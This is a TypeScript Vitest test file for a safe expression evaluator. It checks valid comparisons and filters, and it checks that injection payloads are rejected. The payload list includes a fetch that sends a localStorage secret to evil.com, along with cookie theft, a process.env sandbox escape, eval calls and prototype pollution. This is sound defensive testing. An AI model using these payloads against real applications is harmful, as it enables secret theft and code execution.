import { describe, it, expect } from 'vitest';
import {
  evaluateBooleanExpression,
  evaluateFilterExpression,
  evaluateValueExpression,
  SafeExpressionError,
} from '../safeExpression';

// ── Legitimate expressions ──────────────────────────────────────────────────

describe('evaluateBooleanExpression — valid cases', () => {
  it('evaluates simple comparison', () => {
    expect(evaluateBooleanExpression('count > 5', { count: 10 })).toBe(true);
    expect(evaluateBooleanExpression('count > 5', { count: 3 })).toBe(false);
  });

  it('evaluates logical AND / OR', () => {
    expect(evaluateBooleanExpression('a > 0 and b < 10', { a: 1, b: 5 })).toBe(true);
    expect(evaluateBooleanExpression('a > 0 or b < 0', { a: -1, b: 5 })).toBe(false);
  });

  it('evaluates equality check with string', () => {
    expect(evaluateBooleanExpression("status == 'active'", { status: 'active' })).toBe(true);
  });

  it('evaluates nested property access', () => {
    expect(evaluateBooleanExpression('user.age >= 18', { user: { age: 21 } })).toBe(true);
  });
});

// ── Filter expressions ──────────────────────────────────────────────────────

describe('evaluateFilterExpression — valid cases', () => {
  it('filters items by field', () => {
    const items = [{ price: 50 }, { price: 150 }, { price: 200 }];
    const result = items.filter(item =>
      evaluateFilterExpression('item.price > 100', item as Record<string, unknown>)
    );
    expect(result).toHaveLength(2);
  });
});

// ── Value expressions ───────────────────────────────────────────────────────

describe('evaluateValueExpression — valid cases', () => {
  it('returns computed numeric value', () => {
    expect(evaluateValueExpression('data * 2', { data: 5 })).toBe(10);
  });
});

// ── Injection payloads ──────────────────────────────────────────────────────

describe('injection payload rejection', () => {
  const malicious = [
    "fetch('https://evil.com/' + localStorage.getItem('key'))",
    "localStorage.getItem('SHADOWFLOW_SECRETS_V1')",
    "window.location.href = 'https://evil.com'",
    "document.cookie",
    "eval('alert(1)')",
    "(function(){return process.env})()",
    "constructor.constructor('return process')()",
    "globalThis.fetch('https://evil.com')",
    "XMLHttpRequest",
    "setTimeout('alert(1)', 0)",
  ];

  malicious.forEach(payload => {
    it(`blocks: ${payload.slice(0, 60)}`, () => {
      expect(() =>
        evaluateBooleanExpression(payload, {})
      ).toThrow(SafeExpressionError);
    });
  });

  it('blocks prototype pollution via __proto__', () => {
    expect(() =>
      evaluateBooleanExpression("__proto__.admin == true", {})
    ).toThrow(SafeExpressionError);
  });
});

// ── Edge cases ──────────────────────────────────────────────────────────────

describe('edge cases', () => {
  it('throws SafeExpressionError for invalid syntax', () => {
    expect(() =>
      evaluateBooleanExpression('count >>>', { count: 1 })
    ).toThrow(SafeExpressionError);
  });

  it('filter returns false for parse error (non-throwing path)', () => {
    // evaluateFilterExpression catches non-SafeExpression errors gracefully
    expect(evaluateFilterExpression('item.x >', {})).toBe(false);
  });
});
